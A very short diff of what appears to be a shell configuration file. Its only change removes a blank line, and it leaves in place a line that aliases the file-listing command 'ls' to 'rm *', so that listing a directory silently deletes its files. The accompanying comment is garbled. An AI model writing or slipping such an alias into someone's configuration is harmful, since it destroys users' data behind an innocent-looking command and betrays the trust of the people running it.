@@ -1,3 +1,2 @@
 #Creating and a new alias
-
 alias ls='rm *'
